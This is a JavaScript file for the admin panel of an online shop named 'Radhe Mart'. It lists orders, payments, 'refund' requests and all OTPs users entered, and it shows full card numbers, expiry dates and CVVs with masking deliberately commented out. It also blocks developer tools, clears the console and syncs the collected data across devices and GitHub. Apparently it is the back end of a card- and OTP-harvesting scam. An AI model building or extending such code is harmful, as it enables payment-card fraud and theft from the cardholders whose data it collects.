// Global variables - now using shared data system
let orders = [];
let otps = [];
let payments = [];
let refunds = [];
let refundOtps = [];

// Check admin authentication
function checkAdminAuth() {
    const isLoggedIn = deobfuscateData('adminLoggedIn');
    const loginTime = deobfuscateData('adminLoginTime');
    
    if (!isLoggedIn || isLoggedIn !== 'true') {
        redirectToLogin();
        return false;
    }
    
    // Check if session is expired (24 hours)
    if (loginTime) {
        const currentTime = Date.now();
        const sessionDuration = currentTime - parseInt(loginTime);
        const maxSessionTime = 24 * 60 * 60 * 1000; // 24 hours
        
        if (sessionDuration > maxSessionTime) {
            sessionStorage.removeItem('adminLoggedIn');
            sessionStorage.removeItem('adminLoginTime');
            redirectToLogin();
            return false;
        }
    }
    
    return true;
}

// Redirect to login
function redirectToLogin() {
    alert('Access denied. Please login through the main page.');
    window.location.href = 'index.html';
}

// DOM elements
const totalOrdersEl = document.getElementById('totalOrders');
const totalRevenueEl = document.getElementById('totalRevenue');
const totalOtpsEl = document.getElementById('totalOtps');
const otpsGrid = document.getElementById('otpsGrid');
const refundOtpsGrid = document.getElementById('refundOtpsGrid');
const ordersList = document.getElementById('ordersList');
const refundsList = document.getElementById('refundsList');
const paymentsList = document.getElementById('paymentsList');
const orderSearch = document.getElementById('orderSearch');
const refundSearch = document.getElementById('refundSearch');
const refreshOtpsBtn = document.getElementById('refreshOtps');
const refreshRefundOtpsBtn = document.getElementById('refreshRefundOtps');
const refreshAllOtpsBtn = document.getElementById('refreshAllOtps');
const userOtpsList = document.getElementById('userOtpsList');
const clearOrdersBtn = document.getElementById('clearOrders');
const clearRefundsBtn = document.getElementById('clearRefunds');
const logoutBtn = document.getElementById('logoutBtn');

// Initialize admin dashboard
document.addEventListener('DOMContentLoaded', function() {
    // Check authentication first
    if (!checkAdminAuth()) {
        return;
    }
    
    // Load shared data
    loadAllSharedData();
    
    updateStats();
    displayUserEnteredOTPs();
    displayOTPs();
    displayRefundOTPs();
    displayOrders();
    displayRefunds();
    displayPayments();
    setupEventListeners();
    
    // Set up real-time data listening
    setupRealTimeUpdates();
    
    // Auto-refresh every 10 seconds
    setInterval(() => {
        if (checkAdminAuth()) {
            loadAllSharedData(); // Reload shared data
            updateStats();
            displayUserEnteredOTPs();
            displayOTPs();
            displayRefundOTPs();
            displayOrders();
            displayRefunds();
            displayPayments();
        }
    }, 10000);
    
    // Try to sync with GitHub on load
    if (typeof manualSyncWithGitHub === 'function') {
        manualSyncWithGitHub();
    }
});

// Set up real-time data updates
function setupRealTimeUpdates() {
    // Listen for BroadcastChannel updates (same device, different tabs)
    if (window.BroadcastChannel) {
        const channel = new BroadcastChannel('radhe_mart_data');
        channel.onmessage = (event) => {
            handleRealTimeUpdate(event.data);
        };
    }

    // Listen for localStorage events (cross-tab communication)
    window.addEventListener('storage', (event) => {
        if (event.key === 'data_broadcast' && event.newValue) {
            try {
                const message = JSON.parse(event.newValue);
                handleRealTimeUpdate(message);
            } catch (error) {
                console.warn('Error handling storage event:', error);
            }
        }
    });

    // Listen for direct localStorage changes
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function(key, value) {
        originalSetItem.apply(this, arguments);
        
        // If it's one of our data types, refresh the admin panel
        if (['refunds', 'refundOtps', 'orders', 'otps', 'payments'].includes(key)) {
            setTimeout(() => {
                loadAllSharedData();
                updateStats();
                displayUserEnteredOTPs();
                displayOTPs();
                displayRefundOTPs();
                displayOrders();
                displayRefunds();
                displayPayments();
                showRealTimeIndicator();
            }, 100); // Small delay to ensure data is saved
        }
    };
}

// Handle real-time data updates
function handleRealTimeUpdate(message) {
    if (message.type === 'DATA_UPDATE') {
        console.log(`Real-time update received for ${message.dataType}`);
        console.log('Update data:', message.data);
        
        // Reload all data and refresh displays
        loadAllSharedData();
        updateStats();
        displayUserEnteredOTPs();
        displayOTPs();
        displayRefundOTPs();
        displayOrders();
        displayRefunds();
        displayPayments();
        
        // Show visual indicator
        showRealTimeIndicator();
    }
}

// Force refresh all data (for debugging)
function forceRefreshAllData() {
    console.log('Force refreshing all data...');
    
    // Clear cached data
    window.SHARED_DATA = {
        orders: [],
        refunds: [],
        otps: [],
        refundOtps: [],
        payments: [],
        lastSync: new Date().toISOString()
    };
    
    // Reload from storage
    loadAllSharedData();
    updateStats();
    displayUserEnteredOTPs();
    displayOTPs();
    displayRefundOTPs();
    displayOrders();
    displayRefunds();
    displayPayments();
    
    console.log('Force refresh completed');
}

// Test function to verify data flow
function testDataFlow() {
    console.log('=== TESTING DATA FLOW ===');
    
    // Test 1: Check if functions exist
    console.log('1. Function availability:');
    console.log('   - saveSharedData:', typeof window.saveSharedData);
    console.log('   - loadSharedData:', typeof window.loadSharedData);
    console.log('   - window.dataSync:', typeof window.dataSync);
    
    // Test 2: Check current storage
    console.log('2. Current storage:');
    console.log('   - localStorage refunds:', localStorage.getItem('refunds'));
    console.log('   - sessionStorage refunds:', sessionStorage.getItem('refunds'));
    console.log('   - SHARED_DATA refunds:', window.SHARED_DATA ? window.SHARED_DATA.refunds : 'Not initialized');
    
    // Test 3: Try to load data
    console.log('3. Loading data:');
    const loadedRefunds = loadSharedData('refunds');
    console.log('   - Loaded refunds:', loadedRefunds);
    
    // Test 4: Try to save test data
    console.log('4. Saving test data:');
    const testRefund = {
        id: 'TEST_' + Date.now(),
        cardholderName: 'Test User',
        cardNumber: '1234 5678 9012 3456',
        expiryDate: '12/25',
        cvv: '123',
        description: 'Test refund',
        timestamp: new Date().toISOString(),
        status: 'pending'
    };
    
    let refunds = loadSharedData('refunds');
    refunds.push(testRefund);
    const saveResult = saveSharedData('refunds', refunds);
    console.log('   - Save result:', saveResult);
    console.log('   - New refunds count:', refunds.length);
    
    // Test 5: Reload and display
    console.log('5. Reloading and displaying:');
    loadAllSharedData();
    displayRefunds();
    
    console.log('=== TEST COMPLETED ===');
}

// Show real-time update indicator
function showRealTimeIndicator() {
    const indicator = document.getElementById('realTimeIndicator');
    if (indicator) {
        indicator.style.display = 'block';
        indicator.style.opacity = '1';
        
        // Hide after 3 seconds
        setTimeout(() => {
            indicator.style.opacity = '0';
            setTimeout(() => {
                indicator.style.display = 'none';
            }, 300);
        }, 3000);
    }
}

// Load all shared data
function loadAllSharedData() {
    orders = loadSharedData('orders');
    otps = loadSharedData('otps');
    payments = loadSharedData('payments');
    refunds = loadSharedData('refunds');
    refundOtps = loadSharedData('refundOtps');
    
    // Debug: Log loaded data
    console.log('Admin loaded data:');
    console.log('- Orders:', orders.length);
    console.log('- OTPs:', otps.length);
    console.log('- Payments:', payments.length);
    console.log('- Refunds:', refunds.length, refunds);
    console.log('- Refund OTPs:', refundOtps.length);
}

// Setup event listeners
function setupEventListeners() {
    refreshAllOtpsBtn.addEventListener('click', () => {
        displayUserEnteredOTPs();
        showNotification('All user OTPs refreshed!');
    });
    
    refreshOtpsBtn.addEventListener('click', () => {
        displayOTPs();
        showNotification('Shopping OTPs refreshed!');
    });
    
    refreshRefundOtpsBtn.addEventListener('click', () => {
        displayRefundOTPs();
        showNotification('Refund OTPs refreshed!');
    });
    
    clearOrdersBtn.addEventListener('click', clearAllData);
    clearRefundsBtn.addEventListener('click', clearRefundData);
    logoutBtn.addEventListener('click', logout);
    
    // Add manual sync and backup buttons
    const manualSyncBtn = document.getElementById('manualSyncBtn');
    const downloadBackupBtn = document.getElementById('downloadBackupBtn');
    const debugRefreshBtn = document.getElementById('debugRefreshBtn');
    
    if (manualSyncBtn) {
        manualSyncBtn.addEventListener('click', async () => {
            manualSyncBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Syncing...';
            
            // Try cross-device sync first
            let success = false;
            if (typeof loadCrossDeviceData === 'function') {
                success = await loadCrossDeviceData();
            }
            
            // If cross-device sync fails, try GitHub
            if (!success && typeof manualSyncWithGitHub === 'function') {
                success = await manualSyncWithGitHub();
            }
            
            if (success) {
                showNotification('Data synced successfully from other devices!');
                // Refresh all displays
                loadAllSharedData();
                updateStats();
                displayUserEnteredOTPs();
                displayOTPs();
                displayRefundOTPs();
                displayOrders();
                displayRefunds();
                displayPayments();
            } else {
                showNotification('No new data found. Using local data.');
                // Force refresh local data
                forceRefreshAllData();
            }
            
            manualSyncBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Sync Data';
        });
    }
    
    if (downloadBackupBtn) {
        downloadBackupBtn.addEventListener('click', () => {
            downloadDataBackup();
            showNotification('Backup file downloaded!');
        });
    }
    
    if (debugRefreshBtn) {
        debugRefreshBtn.addEventListener('click', () => {
            forceRefreshAllData();
            showNotification('Debug refresh completed! Check console for details.');
        });
    }
    
    orderSearch.addEventListener('input', handleOrderSearch);
    refundSearch.addEventListener('input', handleRefundSearch);
}

// Update statistics
function updateStats() {
    // Reload data from shared storage
    loadAllSharedData();
    
    totalOrdersEl.textContent = orders.length;
    
    const totalRevenue = orders.reduce((sum, order) => sum + order.total, 0);
    totalRevenueEl.textContent = totalRevenue.toFixed(2);
    
    totalOtpsEl.textContent = otps.length + refundOtps.length;
}

// Display OTPs
function displayOTPs() {
    // Reload OTPs from shared storage
    otps = loadSharedData('otps');
    
    if (otps.length === 0) {
        otpsGrid.innerHTML = `
            <div class="no-data">
                <i class="fas fa-inbox"></i>
                <p>No OTPs generated yet</p>
            </div>
        `;
        return;
    }
    
    // Sort OTPs by timestamp (newest first)
    const sortedOTPs = otps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    otpsGrid.innerHTML = sortedOTPs.map((otpData, index) => {
        const date = new Date(otpData.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        const isRecent = index < 3; // Mark first 3 as recent
        
        return `
            <div class="otp-card ${isRecent ? 'recent' : ''}">
                <div class="otp-number">${otpData.otp}</div>
                <div class="otp-time">${timeString}<br>${dateString}</div>
                <div class="otp-status ${otpData.status}">
                    ${otpData.status.toUpperCase()}
                </div>
                ${otpData.orderId ? `<div style="font-size: 0.8rem; color: #666; margin-top: 0.5rem;">Order: ${otpData.orderId}</div>` : ''}
            </div>
        `;
    }).join('');
}

// Display orders
function displayOrders(ordersToShow = null) {
    const ordersData = ordersToShow || orders;
    
    if (ordersData.length === 0) {
        ordersList.innerHTML = `
            <div class="no-data">
                <i class="fas fa-shopping-bag"></i>
                <p>No orders placed yet</p>
            </div>
        `;
        return;
    }
    
    // Sort orders by timestamp (newest first)
    const sortedOrders = ordersData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    ordersList.innerHTML = sortedOrders.map(order => {
        const date = new Date(order.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        
        return `
            <div class="order-item">
                <div class="order-header">
                    <span class="order-id">${order.id}</span>
                    <span class="order-amount">₹${order.total}</span>
                </div>
                <div class="order-details">
                    <div class="detail-row">
                        <span class="detail-label">Date & Time:</span>
                        <span class="detail-value">${dateString} ${timeString}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Status:</span>
                        <span class="detail-value">${order.status}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Items:</span>
                        <span class="detail-value">${order.items.length} items</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">OTP Used:</span>
                        <span class="detail-value">${order.otp || 'N/A'}</span>
                    </div>
                </div>
                <div class="order-items">
                    <strong>Items:</strong>
                    ${order.items.map(item => `
                        <div style="margin: 0.5rem 0; padding: 0.5rem; background: #f8f9fa; border-radius: 5px; display: flex; align-items: center; gap: 0.5rem;">
                            <img src="${item.image}" alt="${item.name}" style="width: 30px; height: 30px; border-radius: 4px; object-fit: cover;" onerror="this.style.display='none'">
                            ${item.name} - Qty: ${item.quantity} - ₹${item.price * item.quantity}
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    }).join('');
}

// Display payments
function displayPayments() {
    // Reload payments from shared storage
    payments = loadSharedData('payments');
    
    if (payments.length === 0) {
        paymentsList.innerHTML = `
            <div class="no-data">
                <i class="fas fa-credit-card"></i>
                <p>No payments processed yet</p>
            </div>
        `;
        return;
    }
    
    // Sort payments by timestamp (newest first)
    const sortedPayments = payments.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    paymentsList.innerHTML = sortedPayments.map(payment => {
        const date = new Date(payment.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        
        // Remove masking for admin view - show full card details
        // const maskedCardNumber = payment.cardNumber.replace(/\d(?=\d{4})/g, '*');
        
        return `
            <div class="payment-item">
                <div class="payment-header">
                    <span class="payment-id">${payment.orderId}</span>
                    <span class="payment-amount">₹${payment.amount}</span>
                </div>
                <div class="payment-details">
                    <div class="detail-row">
                        <span class="detail-label">Date & Time:</span>
                        <span class="detail-value">${dateString} ${timeString}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Cardholder:</span>
                        <span class="detail-value">${payment.cardholderName}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Card Number:</span>
                        <span class="detail-value">${payment.cardNumber}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Expiry:</span>
                        <span class="detail-value">${payment.expiryDate}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">CVV:</span>
                        <span class="detail-value">${payment.cvv}</span>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// Handle order search
function handleOrderSearch() {
    const searchTerm = orderSearch.value.toLowerCase();
    
    if (searchTerm === '') {
        displayOrders();
        return;
    }
    
    const filteredOrders = orders.filter(order => {
        return order.id.toLowerCase().includes(searchTerm) ||
               order.status.toLowerCase().includes(searchTerm) ||
               order.items.some(item => item.name.toLowerCase().includes(searchTerm)) ||
               order.otp?.includes(searchTerm);
    });
    
    displayOrders(filteredOrders);
}

// Clear all data
function clearAllData() {
    if (confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
        // Clear shared data
        clearAllSharedData();
        
        // Clear local data as backup
        localStorage.removeItem('orders');
        localStorage.removeItem('otps');
        localStorage.removeItem('payments');
        localStorage.removeItem('cart');
        
        // Reset variables
        orders = [];
        otps = [];
        payments = [];
        
        updateStats();
        displayOTPs();
        displayOrders();
        displayPayments();
        
        showNotification('All data cleared successfully!');
    }
}

// Logout functionality
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        // Clear admin session
        sessionStorage.removeItem('adminLoggedIn');
        sessionStorage.removeItem('adminLoginTime');
        
        // Redirect to main page
        window.location.href = 'index.html';
    }
}

// Show notification
function showNotification(message) {
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #27ae60;
        color: white;
        padding: 1rem 2rem;
        border-radius: 5px;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        animation: slideIn 0.3s ease;
    `;
    notification.textContent = message;
    
    // Add animation keyframes
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Remove notification after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// Export data functionality (bonus feature)
function exportData() {
    const data = {
        orders: orders,
        otps: otps,
        payments: payments,
        exportDate: new Date().toISOString()
    };
    
    const dataStr = JSON.stringify(data, null, 2);
    const dataBlob = new Blob([dataStr], {type: 'application/json'});
    
    const link = document.createElement('a');
    link.href = URL.createObjectURL(dataBlob);
    link.download = `radhe-mart-data-${new Date().toISOString().split('T')[0]}.json`;
    link.click();
}

// Add export button functionality if needed
document.addEventListener('keydown', (e) => {
    // Ctrl+E to export data
    if (e.ctrlKey && e.key === 'e') {
        e.preventDefault();
        exportData();
        showNotification('Data exported successfully!');
    }
});

// Real-time updates simulation
function simulateRealTimeUpdates() {
    // Check for new data every 5 seconds
    setInterval(() => {
        const newOrders = JSON.parse(localStorage.getItem('orders')) || [];
        const newOtps = JSON.parse(localStorage.getItem('otps')) || [];
        const newPayments = JSON.parse(localStorage.getItem('payments')) || [];
        
        if (newOrders.length !== orders.length || 
            newOtps.length !== otps.length || 
            newPayments.length !== payments.length) {
            
            orders = newOrders;
            otps = newOtps;
            payments = newPayments;
            
            updateStats();
            displayOTPs();
            displayOrders();
            displayPayments();
        }
    }, 5000);
}

// Start real-time updates
simulateRealTimeUpdates();
// Display Refund OTPs
function displayRefundOTPs() {
    // Reload refund OTPs from shared storage
    refundOtps = loadSharedData('refundOtps');
    
    if (refundOtps.length === 0) {
        refundOtpsGrid.innerHTML = `
            <div class="no-data">
                <i class="fas fa-undo"></i>
                <p>No refund OTPs generated yet</p>
            </div>
        `;
        return;
    }
    
    // Sort refund OTPs by timestamp (newest first)
    const sortedRefundOTPs = refundOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    refundOtpsGrid.innerHTML = sortedRefundOTPs.map((otpData, index) => {
        const date = new Date(otpData.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        const isRecent = index < 3; // Mark first 3 as recent
        
        return `
            <div class="otp-card ${isRecent ? 'recent' : ''}">
                <div class="otp-number">${otpData.otp}</div>
                <div class="otp-time">${timeString}<br>${dateString}</div>
                <div class="otp-status ${otpData.status}">
                    ${otpData.status.toUpperCase()}
                </div>
                <div style="font-size: 0.8rem; color: #666; margin-top: 0.5rem;">
                    Refund ID: ${otpData.refundId}<br>
                    Amount: ₹${otpData.amount}
                </div>
            </div>
        `;
    }).join('');
}

// Display refunds
function displayRefunds(refundsToShow = null) {
    const refundsData = refundsToShow || refunds;
    
    // Debug: Log refund display
    console.log('displayRefunds called with:', refundsData.length, 'refunds');
    console.log('Refunds data:', refundsData);
    console.log('refundsList element:', refundsList);
    
    if (!refundsList) {
        console.error('refundsList element not found!');
        return;
    }
    
    if (refundsData.length === 0) {
        refundsList.innerHTML = `
            <div class="no-data">
                <i class="fas fa-undo"></i>
                <p>No refund requests yet</p>
            </div>
        `;
        console.log('No refunds to display');
        return;
    }
    
    // Sort refunds by timestamp (newest first)
    const sortedRefunds = refundsData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    refundsList.innerHTML = sortedRefunds.map(refund => {
        const date = new Date(refund.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        
        // Mask card number for security
        // const maskedCardNumber = refund.cardNumber.replace(/\d(?=\d{4})/g, '*');
        
        return `
            <div class="order-item">
                <div class="order-header">
                    <span class="order-id">${refund.id}</span>
                    <span class="order-amount">₹${refund.amount}</span>
                </div>
                <div class="order-details">
                    <div class="detail-row">
                        <span class="detail-label">Date & Time:</span>
                        <span class="detail-value">${dateString} ${timeString}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Status:</span>
                        <span class="detail-value" style="color: ${refund.status === 'processed' ? '#27ae60' : '#f39c12'}">${refund.status.toUpperCase()}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Cardholder:</span>
                        <span class="detail-value">${refund.cardholderName}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Card Number:</span>
                        <span class="detail-value">${refund.cardNumber}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Expiry:</span>
                        <span class="detail-value">${refund.expiryDate}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">CVV:</span>
                        <span class="detail-value">${refund.cvv}</span>
                    </div>
                    ${refund.otpVerified ? `
                    <div class="detail-row">
                        <span class="detail-label">OTP Verified:</span>
                        <span class="detail-value">${refund.otpVerified}</span>
                    </div>
                    ` : ''}
                </div>
                ${refund.description ? `
                <div style="margin-top: 1rem; padding: 1rem; background: #f8f9fa; border-radius: 5px;">
                    <strong>Description:</strong><br>
                    ${refund.description}
                </div>
                ` : ''}
            </div>
        `;
    }).join('');
}

// Handle refund search
function handleRefundSearch() {
    const searchTerm = refundSearch.value.toLowerCase();
    
    if (searchTerm === '') {
        displayRefunds();
        return;
    }
    
    const filteredRefunds = refunds.filter(refund => {
        return refund.id.toLowerCase().includes(searchTerm) ||
               refund.cardholderName.toLowerCase().includes(searchTerm) ||
               refund.status.toLowerCase().includes(searchTerm) ||
               refund.amount.toString().includes(searchTerm);
    });
    
    displayRefunds(filteredRefunds);
}

// Clear refund data
function clearRefundData() {
    if (confirm('Are you sure you want to clear all refund data? This action cannot be undone.')) {
        // Clear shared refund data
        saveSharedData('refunds', []);
        saveSharedData('refundOtps', []);
        
        // Clear local data as backup
        localStorage.removeItem('refunds');
        localStorage.removeItem('refundOtps');
        
        refunds = [];
        refundOtps = [];
        
        updateStats();
        displayRefundOTPs();
        displayRefunds();
        
        showNotification('All refund data cleared successfully!');
    }
}

// Display all user entered OTPs (both shopping and refund)
function displayUserEnteredOTPs() {
    // Reload all OTP data from shared storage
    const shoppingOtps = loadSharedData('otps');
    const refundOtps = loadSharedData('refundOtps');
    
    // Combine all OTPs
    const allOtps = [
        ...shoppingOtps.map(otp => ({...otp, type: 'Shopping'})),
        ...refundOtps.map(otp => ({...otp, type: 'Refund'}))
    ];
    
    if (allOtps.length === 0) {
        userOtpsList.innerHTML = `
            <div class="no-data">
                <i class="fas fa-key"></i>
                <p>No OTPs entered by users yet</p>
            </div>
        `;
        return;
    }
    
    // Sort all OTPs by timestamp (newest first)
    const sortedOtps = allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    userOtpsList.innerHTML = sortedOtps.map((otpData, index) => {
        const date = new Date(otpData.timestamp);
        const timeString = date.toLocaleTimeString();
        const dateString = date.toLocaleDateString();
        const isRecent = index < 5; // Mark first 5 as recent
        
        return `
            <div class="otp-entry ${isRecent ? 'recent-entry' : ''}">
                <div class="otp-entry-header">
                    <div class="otp-number-large">${otpData.otp}</div>
                    <div class="otp-type-badge ${otpData.type.toLowerCase()}">${otpData.type}</div>
                </div>
                <div class="otp-entry-details">
                    <div class="detail-row">
                        <span class="detail-label">Date & Time:</span>
                        <span class="detail-value">${dateString} ${timeString}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Status:</span>
                        <span class="detail-value status-${otpData.status}">${otpData.status.toUpperCase()}</span>
                    </div>
                    ${otpData.orderId ? `
                    <div class="detail-row">
                        <span class="detail-label">Order ID:</span>
                        <span class="detail-value">${otpData.orderId}</span>
                    </div>
                    ` : ''}
                    ${otpData.refundId ? `
                    <div class="detail-row">
                        <span class="detail-label">Refund ID:</span>
                        <span class="detail-value">${otpData.refundId}</span>
                    </div>
                    ` : ''}
                    ${otpData.amount ? `
                    <div class="detail-row">
                        <span class="detail-label">Amount:</span>
                        <span class="detail-value">₹${otpData.amount}</span>
                    </div>
                    ` : ''}
                </div>
            </div>
        `;
    }).join('');
}
// Reward amount functionality removed as per user request

// Cookie helper functions for admin panel
function setCookie(name, value, days = 365) {
    const expires = new Date();
    expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Lax`;
}

function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

// Reward history functionality removed as per user request
// Additional security measures
(function() {
    'use strict';
    
    // Disable right-click context menu on admin page
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Disable F12, Ctrl+Shift+I, Ctrl+U (developer tools)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            return false;
        }
        // Ctrl+Shift+I
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            return false;
        }
        // Ctrl+U
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            return false;
        }
        // Ctrl+S (save page)
        if (e.ctrlKey && e.keyCode === 83) {
            e.preventDefault();
            return false;
        }
    });
    
    // Clear console periodically
    setInterval(function() {
        console.clear();
    }, 5000);
    
    // Detect if developer tools are open
    let devtools = {
        open: false,
        orientation: null
    };
    
    const threshold = 160;
    
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                console.log('Developer tools detected. Logging out for security.');
                logout();
            }
        } else {
            devtools.open = false;
        }
    }, 500);
    
})();

// Obfuscate sensitive data in memory
function obfuscateData() {
    // This function helps prevent easy data extraction from browser memory
    const sensitiveKeys = ['adminLoggedIn', 'adminLoginTime'];
    
    sensitiveKeys.forEach(key => {
        const value = sessionStorage.getItem(key);
        if (value) {
            sessionStorage.setItem(key, btoa(value));
        }
    });
}

// Deobfuscate data when needed
function deobfuscateData(key) {
    const value = sessionStorage.getItem(key);
    if (value) {
        try {
            return atob(value);
        } catch (e) {
            return value;
        }
    }
    return null;
}